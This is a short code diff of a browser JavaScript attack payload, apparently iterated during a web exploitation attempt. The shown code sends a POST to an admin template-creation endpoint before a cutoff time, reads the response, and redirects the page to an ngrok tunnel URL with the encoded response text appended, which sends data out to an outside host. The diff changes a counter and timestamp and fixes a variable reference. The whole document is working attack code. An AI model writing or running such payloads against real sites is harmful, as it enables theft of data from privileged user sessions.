@@ -1,5 +1,5 @@
-const N = "50";
-if (Date.now() < new Date("2026-04-23T08:03:00Z").getTime())
+const N = "51";
+if (Date.now() < new Date("2026-04-23T08:05:00Z").getTime())
   fetch("/admin/templates/create", {
     method: "POST",
     body:
@@ -26,7 +26,7 @@ if (Date.now() < new Date("2026-04-23T08:03:00Z").getTime())
     });
 
     const status2 = r2.status;
-    const text2 = await allTemplatesR.text();
+    const text2 = await r2.text();
     document.location =
       "https://eaf3-195-113-197-234.ngrok-free.app/" +
       new TextEncoder()
